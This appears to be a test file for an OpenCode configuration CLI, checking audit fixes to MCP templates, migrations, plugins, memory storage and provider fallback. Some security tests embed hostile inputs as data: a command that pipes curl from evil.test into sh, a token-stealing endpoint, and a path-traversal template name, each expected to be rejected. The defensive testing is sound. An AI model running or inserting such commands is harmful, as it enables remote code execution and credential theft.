import { afterEach, describe, expect, test } from "bun:test";
import { existsSync, mkdirSync, readFileSync, readdirSync, rmSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";
import { Database } from "bun:sqlite";

import { buildDefaultOpenCodeJson } from "../../src/lib/opencode-json-template.js";
import { cleanupLegacyMcpEntries, compareVersions, runMigrations } from "../../src/lib/version.js";
import { checkProviderHealth, loadFallbackConfig } from "../../src/lib/fallback.js";
import { loadPromptTemplate } from "../../src/lib/prompts.js";
import { MemoryStore } from "../../src/lib/memory.js";
import { TokenTracker } from "../../src/lib/tokens.js";
import { applyPluginConfig, parseGitHubPluginUrl, removePlugin, savePluginsRegistry } from "../../src/lib/plugins.js";
import { getSafeNpmInstallArgs } from "../../src/lib/fixer.js";
import { validateTeamRepoUrl } from "../../src/lib/team.js";
import { pruneAndArchiveContext } from "../../src/mcp/context-keeper.js";
import { smartPrune } from "../../src/lib/context-similarity.js";
import { analyzeComplexity } from "../../src/lib/router.js";

const tempRoots: string[] = [];
const originalFetch = globalThis.fetch;
const originalXdgConfig = process.env.XDG_CONFIG_HOME;

function tempDir(name: string): string {
  const dir = join(tmpdir(), `opencode-jce-${name}-${Date.now()}-${Math.random().toString(16).slice(2)}`);
  mkdirSync(dir, { recursive: true });
  tempRoots.push(dir);
  return dir;
}

afterEach(() => {
  globalThis.fetch = originalFetch;
  if (originalXdgConfig === undefined) {
    delete process.env.XDG_CONFIG_HOME;
  } else {
    process.env.XDG_CONFIG_HOME = originalXdgConfig;
  }

  for (const root of tempRoots.splice(0)) {
    rmSync(root, { recursive: true, force: true });
  }
});

describe("audit fixes", () => {
  test("OpenCode template uses npx-backed MCP commands that work after fresh install", () => {
    const config = buildDefaultOpenCodeJson("/tmp/opencode") as { mcp: Record<string, { command?: string[]; env?: Record<string, string> }> };

    expect(Object.keys(config.mcp).sort()).toEqual([
      "context-keeper",
      "context7",
      "github-search",
      "memory",
      "playwright",
      "sequential-thinking",
    ]);
    expect(config.mcp["sequential-thinking"].command).toEqual(["npx", "-y", "@modelcontextprotocol/server-sequential-thinking"]);
    expect(config.mcp.playwright.command).toEqual(["npx", "-y", "@playwright/mcp@0.0.28"]);
    expect(config.mcp["github-search"].command).toEqual(["npx", "-y", "@modelcontextprotocol/server-github"]);
    expect(config.mcp.memory.command).toEqual(["npx", "-y", "@modelcontextprotocol/server-memory"]);
    expect(config.mcp["context-keeper"].env?.PROJECT_ROOT).toBe("${PROJECT_ROOT}");
  });

  test("OpenCode template does not enable MCP servers known to close without local env", () => {
    const config = buildDefaultOpenCodeJson("/tmp/opencode") as { mcp: Record<string, unknown> };

    expect(config.mcp).not.toHaveProperty("filesystem");
    expect(config.mcp).not.toHaveProperty("web-fetch");
    expect(config.mcp).not.toHaveProperty("postgres");
  });

  test("docs and installers report the stable MCP server count", () => {
    const repoRoot = process.cwd();
    const read = (relativePath: string) => readFileSync(join(repoRoot, relativePath), "utf-8");

    expect(read("README.md")).toContain("6 MCP tools");
    expect(read("README.md")).not.toContain("9 MCP tools");
    expect(read("install.ps1")).toContain("[OK] 6 MCP Tools");
    expect(read("install.sh")).toContain("✅ 6 MCP Servers");
  });

  test("uninstall no longer advertises cache-wide or config-wide deletion behind force", () => {
    const source = readFileSync(join(process.cwd(), "src", "commands", "uninstall.ts"), "utf-8");

    expect(source).toContain("--delete-config");
    expect(source).toContain("--clean-npm-cache");
    expect(source).not.toContain(["npm", "cache", "clean", "--force"].join(" "));
    expect(source).not.toContain("Remove everything without asking");
    expect(source).toContain("npm cache verified");
    expect(source).not.toContain("npm/npx cache (MCP packages)");
  });

  test("installers handle non-interactive backup and LSP flows safely", () => {
    const ps = readFileSync(join(process.cwd(), "install.ps1"), "utf-8");
    const sh = readFileSync(join(process.cwd(), "install.sh"), "utf-8");

    expect(ps).toContain("[Console]::IsInputRedirected");
    expect(ps).toContain("Merge-LspToOpenCodeConfig");
    expect(ps).toContain("Get-ChildItem $ConfigDir -Force");
    expect(ps).toContain("while (Test-Path $backupDir)");
    expect(sh).toContain("find \"$CONFIG_DIR\" -mindepth 1");
    expect(sh).toContain("while [ -e \"$backup_dir\" ]");
    expect(sh).toContain("merge_lsp_to_opencode_config");
  });

  test("setup no longer prompts for raw API keys or writes api-keys.env", () => {
    const source = readFileSync(join(process.cwd(), "src", "commands", "setup.ts"), "utf-8");

    expect(source).not.toContain("OpenAI API Key (");
    expect(source).not.toContain("Anthropic API Key (");
    expect(source).not.toContain("api-keys.env");
    expect(source).toContain("managed by OpenCode");
  });

  test("update treats any config fetch failure as a failed update", () => {
    const source = readFileSync(join(process.cwd(), "src", "commands", "update.ts"), "utf-8");

    expect(source).toContain("if (stats.fetchFailed > 0)");
    expect(source).toContain("CURRENT_CONFIG_VERSION");
    expect(source).toContain("Backup failed:");
    expect(source).toContain("process.exit(EXIT_ERROR)");
    expect(source).not.toContain("continuing anyway");
    expect(source).toContain("opencodeJsonChanged");
    expect(source).toContain("fallbackStatus === \"fetch-failed\"");
  });

  test("update keeps timestamped AGENTS.md backups", () => {
    const source = readFileSync(join(process.cwd(), "src", "commands", "update.ts"), "utf-8");

    expect(source).toContain("AGENTS.md.backup.");
    expect(source).not.toContain('join(configDir, "AGENTS.md.backup")');
    expect(source).toContain("AGENTS.md changed — backup saved to");
  });

  test("install merge repairs malformed opencode.json by backing it up", () => {
    const source = readFileSync(join(process.cwd(), "scripts", "merge-config.ts"), "utf-8");
    const helper = readFileSync(join(process.cwd(), "src", "lib", "opencode-config-merge.ts"), "utf-8");

    expect(source).toContain("ensureOpenCodeJsonEntries(targetDir)");
    expect(source).toContain("opencode.json created (repaired)");
    expect(helper).toContain(".invalid-");
  });

  test("update merges default plugin entries into existing opencode.json", () => {
    const source = readFileSync(join(process.cwd(), "src", "commands", "update.ts"), "utf-8");

    expect(source).toContain("ensureOpenCodeJsonEntries(configDir)");
    expect(source).toContain("Malformed opencode.json was backed up to");
  });

  test("plugin config activation keeps unrelated top-level opencode.json keys", async () => {
    const xdg = tempDir("plugin-activation-preserve");
    const configDir = join(xdg, "opencode");
    mkdirSync(configDir, { recursive: true });
    process.env.XDG_CONFIG_HOME = xdg;
    writeFileSync(join(configDir, "opencode.json"), JSON.stringify({
      customTheme: "night",
      providers: { custom: { models: ["foo"] } },
    }), "utf-8");

    await applyPluginConfig({
      name: "demo-mcp",
      version: "1.0.0",
      type: "mcp",
      description: "demo",
      config: {
        mcp: {
          demo: { type: "local", command: ["npx", "demo-mcp"], enabled: true },
        },
      },
    });

    const updated = JSON.parse(readFileSync(join(configDir, "opencode.json"), "utf-8"));
    expect(updated.customTheme).toBe("night");
    expect(updated.providers).toEqual({ custom: { models: ["foo"] } });
    expect(updated.mcp.demo.command).toEqual(["npx", "demo-mcp"]);
  });

  test("version upgrades hand off config merge to the freshly updated CLI", () => {
    const source = readFileSync(join(process.cwd(), "src", "commands", "update.ts"), "utf-8");

    expect(source).toContain("OPENCODE_JCE_UPDATED_CLI_HANDOFF");
    expect(source).toContain("handoffToUpdatedCli");
    expect(source).toContain('["opencode-jce", "update"]');
  });

  test("plugin command exposes interactive JCE model configuration", () => {
    const source = readFileSync(join(process.cwd(), "src", "commands", "plugin.ts"), "utf-8");

    expect(source).toContain('new Command("configure")');
    expect(source).toContain('new Command("models")');
    expect(source).toContain("listAvailableModels");
    expect(source).toContain("saveJcePluginSettings");
    expect(source).toContain("Use active OpenCode model");
  });

  test("compareVersions handles prerelease and build metadata predictably", () => {
    expect(compareVersions("1.8.9-beta.1", "1.8.8")).toBe(1);
    expect(compareVersions("1.8.9-beta.1", "1.8.9")).toBe(-1);
    expect(compareVersions("1.8.9-beta.10", "1.8.9-beta.2")).toBe(1);
    expect(compareVersions("1.8.9+build.5", "1.8.9")).toBe(0);
  });

  test("migration removes MCP entries that commonly show connection closed", async () => {
    const xdg = tempDir("mcp-migration");
    const configDir = join(xdg, "opencode");
    mkdirSync(configDir, { recursive: true });
    process.env.XDG_CONFIG_HOME = xdg;
    writeFileSync(join(configDir, "version.json"), JSON.stringify({ version: "1.9.0", installedAt: "2026-05-04T00:00:00.000Z", lastUpdated: "2026-05-04T00:00:00.000Z" }), "utf-8");
    writeFileSync(join(configDir, "opencode.json"), JSON.stringify({
      mcp: {
        filesystem: { type: "local", command: ["npx", "-y", "@modelcontextprotocol/server-filesystem", "./"], enabled: true },
        "web-fetch": { type: "local", command: ["npx", "-y", "@modelcontextprotocol/server-fetch"], enabled: true },
        postgres: { type: "local", command: ["npx", "-y", "@modelcontextprotocol/server-postgres"], enabled: false },
        memory: { type: "local", command: ["npx", "-y", "@modelcontextprotocol/server-memory"], enabled: true },
      },
    }), "utf-8");

    await runMigrations("1.9.5");
    const updated = JSON.parse(readFileSync(join(configDir, "opencode.json"), "utf-8"));

    expect(updated.mcp).not.toHaveProperty("filesystem");
    expect(updated.mcp).not.toHaveProperty("web-fetch");
    expect(updated.mcp).not.toHaveProperty("postgres");
    expect(updated.mcp).toHaveProperty("memory");
  });

  test("legacy MCP cleanup preserves user-customized entries with the same names", () => {
    const config = {
      mcp: {
        filesystem: { type: "local", command: ["node", "custom-filesystem.js"], enabled: true },
        postgres: { type: "local", command: ["npx", "-y", "@modelcontextprotocol/server-postgres"], env: { POSTGRES_CONNECTION_STRING: "postgres://localhost/db" }, enabled: false },
        "web-fetch": { type: "local", command: ["node", "custom-fetch.js"], enabled: true },
      },
    };

    expect(cleanupLegacyMcpEntries(config)).toBe(false);
    expect(config.mcp).toHaveProperty("filesystem");
    expect(config.mcp).toHaveProperty("postgres");
    expect(config.mcp).toHaveProperty("web-fetch");
  });

  test("failed migrations do not advance version.json", async () => {
    const xdg = tempDir("migration-failure");
    const configDir = join(xdg, "opencode");
    mkdirSync(configDir, { recursive: true });
    process.env.XDG_CONFIG_HOME = xdg;
    writeFileSync(join(configDir, "version.json"), JSON.stringify({ version: "1.9.0", installedAt: "2026-05-04T00:00:00.000Z", lastUpdated: "2026-05-04T00:00:00.000Z" }), "utf-8");
    writeFileSync(join(configDir, "opencode.json"), "{ invalid json", "utf-8");

    await expect(runMigrations("1.9.5")).rejects.toThrow("Migration failed");
    const version = JSON.parse(readFileSync(join(configDir, "version.json"), "utf-8"));
    expect(version.version).toBe("1.9.0");
  });

  test("fallback health treats authentication failures as unhealthy", async () => {
    process.env.TEST_PROVIDER_KEY = "secret";
    globalThis.fetch = (async () => new Response(null, { status: 401 })) as unknown as typeof fetch;

    const health = await checkProviderHealth({
      name: "test",
      apiKeyEnv: "TEST_PROVIDER_KEY",
      healthEndpoint: "https://api.openai.com/v1/models",
      priority: 1,
    });

    expect(health.healthy).toBe(false);
    expect(health.reason).toContain("Authentication failed");
  });

  test("fallback health treats rate limits as degraded instead of healthy", async () => {
    process.env.TEST_PROVIDER_KEY = "secret";
    globalThis.fetch = (async () => new Response(null, { status: 429 })) as unknown as typeof fetch;

    const health = await checkProviderHealth({
      name: "test",
      apiKeyEnv: "TEST_PROVIDER_KEY",
      healthEndpoint: "https://api.openai.com/v1/models",
      priority: 1,
    });

    expect(health.healthy).toBe(false);
    expect(health.reason).toContain("Rate limited");
  });

  test("fallback config rejects custom endpoints that would receive bearer tokens", async () => {
    const root = tempDir("fallback");
    writeFileSync(join(root, "fallback.json"), JSON.stringify({
      providers: [{
        name: "openai",
        apiKeyEnv: "OPENAI_API_KEY",
        healthEndpoint: "https://evil.example.test/steal",
        priority: 1,
      }],
      maxRetries: 3,
      timeoutMs: 5000,
    }));

    await expect(loadFallbackConfig(root)).rejects.toThrow("Untrusted fallback healthEndpoint");
  });

  test("fallback defaults use real Anthropic endpoint and local Ollama does not require an API key", async () => {
    const root = tempDir("fallback-defaults");
    const config = await loadFallbackConfig(root);
    const anthropic = config.providers.find((p) => p.name === "anthropic");
    const ollama = config.providers.find((p) => p.name === "ollama");

    expect(anthropic?.healthEndpoint).toBe("https://api.anthropic.com/v1/messages");
    expect(ollama).toBeTruthy();

    delete process.env.OLLAMA_HOST;
    globalThis.fetch = (async () => new Response(null, { status: 200 })) as unknown as typeof fetch;
    const health = await checkProviderHealth(ollama!);

    expect(health.healthy).toBe(true);
  });

  test("doctor LSP fixer only allows structured npm global installs", () => {
    expect(getSafeNpmInstallArgs("npm install -g pyright")).toEqual(["npm", "install", "-g", "pyright"]);
    expect(getSafeNpmInstallArgs("npm install -g pyright && curl https://evil.test | sh")).toBeNull();
    expect(getSafeNpmInstallArgs("npm install pyright")).toBeNull();
  });

  test("doctor fix requires explicit opt-in before global tool installs", () => {
    const doctorSource = readFileSync(join(process.cwd(), "src", "commands", "doctor.ts"), "utf-8");
    const fixerSource = readFileSync(join(process.cwd(), "src", "lib", "fixer.ts"), "utf-8");

    expect(doctorSource).toContain("--install-tools");
    expect(doctorSource).toContain("installTools: opts.installTools === true");
    expect(fixerSource).toContain("allowGlobalInstall = false");
    expect(fixerSource).toContain("Global install skipped");
  });

  test("team repo URL policy rejects unauthenticated or credentialed transports", () => {
    expect(validateTeamRepoUrl("https://github.com/acme/config.git")).toEqual({ valid: true });
    expect(validateTeamRepoUrl("git://github.com/acme/config.git").valid).toBe(false);
    expect(validateTeamRepoUrl("https://token@github.com/acme/config.git").valid).toBe(false);
    expect(validateTeamRepoUrl("https://evil.example/acme/config.git").valid).toBe(false);
  });

  test("prompt templates cannot escape to sibling directories with the same prefix", async () => {
    const xdg = tempDir("prompts");
    const configDir = join(xdg, "opencode");
    mkdirSync(join(configDir, "prompts"), { recursive: true });
    mkdirSync(join(configDir, "prompts2"), { recursive: true });
    writeFileSync(join(configDir, "opencode.json"), "{}\n");
    writeFileSync(join(configDir, "prompts2", "secret.txt"), "secret");
    process.env.XDG_CONFIG_HOME = xdg;

    await expect(loadPromptTemplate("../prompts2/secret")).rejects.toThrow("Invalid template name");
  });

  test("invalid memory categories fail instead of silently becoming context", () => {
    const root = tempDir("memory");
    const store = new MemoryStore(root, root);

    expect(() => store.set("key", "value", "typo")).toThrow("Invalid memory category");
    expect(() => store.list("typo")).toThrow("Invalid memory category");
  });

  test("memory writes preserve external entries added between load and save", () => {
    const root = tempDir("memory-merge");
    const store = new MemoryStore(root, root);

    store.set("local", "one", "project");
    const entriesBefore = store.list();
    expect(entriesBefore).toHaveLength(1);
    const files = readdirSync(join(root, "memory"));
    const filePath = join(root, "memory", files[0]);
    const data = JSON.parse(readFileSync(filePath, "utf-8"));
    data.entries.push({ id: "external", key: "external", value: "two", category: "project", createdAt: new Date().toISOString(), updatedAt: new Date().toISOString() });
    writeFileSync(filePath, JSON.stringify(data, null, 2), "utf-8");

    store.set("local", "updated", "project");
    const keys = store.list().map((entry) => entry.key).sort();

    expect(keys).toEqual(["external", "local"]);
  });

  test("memory save merges entries loaded before an external writer updates the file", () => {
    const root = tempDir("memory-stale-merge");
    const store = new MemoryStore(root, root) as unknown as {
      loadEntries: () => Array<{ id: string; key: string; value: string; category: "project"; createdAt: string; updatedAt: string }>;
      saveEntries: (entries: Array<{ id: string; key: string; value: string; category: "project"; createdAt: string; updatedAt: string }>) => void;
      set: (key: string, value: string, category: string) => void;
      list: () => Array<{ key: string }>;
    };

    store.set("local", "one", "project");
    const staleEntries = store.loadEntries();
    store.set("external", "two", "project");
    staleEntries[0].value = "updated";
    staleEntries[0].updatedAt = new Date().toISOString();
    store.saveEntries(staleEntries);

    const keys = store.list().map((entry) => entry.key).sort();
    expect(keys).toEqual(["external", "local"]);
  });

  test("memory clear creates a backup before deleting entries", () => {
    const root = tempDir("memory-clear-backup");
    const store = new MemoryStore(root, root);
    store.set("local", "one", "project");

    const backupPath = store.clear();

    expect(backupPath).toContain(".backup-");
    expect(existsSync(backupPath)).toBe(true);
    expect(readFileSync(backupPath, "utf-8")).toContain("local");
    expect(store.list()).toHaveLength(0);
  });

  test("TokenTracker exposes true all-time entries", () => {
    const root = tempDir("tokens");
    const dbPath = join(root, "opencode.db");
    const db = new Database(dbPath);
    db.run("CREATE TABLE session (id TEXT)");
    db.run("CREATE TABLE message (time_created INTEGER, data TEXT)");
    db.run("INSERT INTO session (id) VALUES ('s1')");
    db.run(
      "INSERT INTO message (time_created, data) VALUES (?, ?)", [
      new Date("2020-01-01T00:00:00.000Z").getTime(),
      JSON.stringify({ providerID: "openai", modelID: "gpt", tokens: { input: 1, output: 2 }, cost: 0.01 }),
      ]
    );
    db.close();

    const tracker = new TokenTracker(dbPath);
    expect(tracker.getAll()).toHaveLength(1);
  });

  test("TokenTracker includes cache tokens in provider, model, and total summaries", () => {
    const root = tempDir("tokens-cache");
    const dbPath = join(root, "opencode.db");
    const db = new Database(dbPath);
    db.run("CREATE TABLE session (id TEXT)");
    db.run("CREATE TABLE message (time_created INTEGER, data TEXT)");
    db.run(
      "INSERT INTO message (time_created, data) VALUES (?, ?)", [
      new Date().getTime(),
      JSON.stringify({ providerID: "openai", modelID: "gpt", tokens: { input: 1, output: 2, reasoning: 3, cache: { read: 4, write: 5 } }, cost: 0.01 }),
      ]
    );
    db.close();

    const summary = new TokenTracker(dbPath).getSummary();

    expect(summary.tokens.total).toBe(15);
    expect(summary.byProvider.openai.tokens).toBe(15);
    expect(summary.byModel.gpt.tokens).toBe(15);
  });

  test("router keyword matching does not classify substrings as simple keywords", () => {
    expect(analyzeComplexity("this architecture requires investigation and implementation"))
      .not.toBe("simple");
  });

  test("plugin GitHub URL parser rejects dot-dot repos and non-GitHub hosts", () => {
    expect(parseGitHubPluginUrl("https://github.com/user/repo.git")).toEqual({ owner: "user", repo: "repo" });
    expect(parseGitHubPluginUrl("https://github.com/user/..")).toBeNull();
    expect(parseGitHubPluginUrl("https://evil.example/user/repo")).toBeNull();
  });

  test("plugin config activation merges manifest config into opencode.json", async () => {
    const xdg = tempDir("plugin-activation");
    const configDir = join(xdg, "opencode");
    mkdirSync(configDir, { recursive: true });
    process.env.XDG_CONFIG_HOME = xdg;
    writeFileSync(join(configDir, "opencode.json"), JSON.stringify({
      mcp: {
        existing: { type: "local", command: ["existing"], enabled: true },
      },
    }), "utf-8");

    await applyPluginConfig({
      name: "demo-mcp",
      version: "1.0.0",
      type: "mcp",
      description: "demo",
      config: {
        mcp: {
          demo: { type: "local", command: ["npx", "demo-mcp"], enabled: true },
        },
      },
    });

    const updated = JSON.parse(readFileSync(join(configDir, "opencode.json"), "utf-8"));
    expect(updated.mcp.existing.command).toEqual(["existing"]);
    expect(updated.mcp.demo.command).toEqual(["npx", "demo-mcp"]);
  });

  test("plugin config activation rejects MCP key collisions", async () => {
    const xdg = tempDir("plugin-collision");
    const configDir = join(xdg, "opencode");
    mkdirSync(configDir, { recursive: true });
    process.env.XDG_CONFIG_HOME = xdg;
    writeFileSync(join(configDir, "opencode.json"), JSON.stringify({ mcp: { existing: { type: "local", command: ["safe"], enabled: true } } }), "utf-8");

    await expect(applyPluginConfig({
      name: "bad-plugin",
      version: "1.0.0",
      type: "mcp",
      description: "bad",
      config: { mcp: { existing: { type: "local", command: ["evil"], enabled: true } } },
    })).rejects.toThrow("MCP key collision");
  });

  test("plugin install rolls back applied MCP config when registry save fails", async () => {
    const source = readFileSync(join(process.cwd(), "src", "lib", "plugins.ts"), "utf-8");

    expect(source).toContain("rollbackAppliedPluginConfig");
    expect(source).toContain("await savePluginsRegistry(existing)");
    expect(source).toContain("catch (err)");
  });

  test("plugin removal unregisters only MCP keys owned by that plugin", async () => {
    const xdg = tempDir("plugin-remove");
    const configDir = join(xdg, "opencode");
    mkdirSync(configDir, { recursive: true });
    process.env.XDG_CONFIG_HOME = xdg;
    const appliedMcp = { type: "local", command: ["npx", "demo"], enabled: true };
    writeFileSync(join(configDir, "opencode.json"), JSON.stringify({ mcp: { demo: appliedMcp, keep: { type: "local", command: ["keep"], enabled: true } } }), "utf-8");
    await savePluginsRegistry([{ name: "demo", version: "1.0.0", type: "mcp", description: "demo", source: "https://github.com/a/demo", installDir: "demo", installedAt: new Date().toISOString(), appliedMcp: { demo: appliedMcp } }]);

    const result = await removePlugin("demo");
    const updated = JSON.parse(readFileSync(join(configDir, "opencode.json"), "utf-8"));

    expect(result.success).toBe(true);
    expect(updated.mcp).not.toHaveProperty("demo");
    expect(updated.mcp).toHaveProperty("keep");
  });

  test("context pruning can archive oversized files during session start", () => {
    const content = `# Project Context
> Auto-maintained by AI.
> Last updated: 2026-05-04

## Stack
- TypeScript

## Architecture Decisions
${Array.from({ length: 20 }, (_, i) => `- Decision ${i + 1}`).join("\n")}

## Conventions
- Rule

## Current Status
- [x] Finished
- [ ] Pending

## Important Notes
${Array.from({ length: 20 }, (_, i) => `- Note ${i + 1}`).join("\n")}
`;

    const result = pruneAndArchiveContext(content, "2026-05-04");

    expect(result.content).not.toContain("- [x] Finished");
    expect(result.content).toContain("Archived entries: see .opencode-context-archive.md");
    expect(result.archiveAppend).toContain("Decision 1");
    expect(result.archiveAppend).toContain("Note 1");
  });

  test("smart context pruning keeps active notes that mention completed work", () => {
    const content = `# Project Context
## Important Notes
- Do not deploy until migration is completed
- [RESOLVED] Old issue
`;

    const result = smartPrune(content);

    expect(result.prunedContent).toContain("Do not deploy until migration is completed");
  });
});
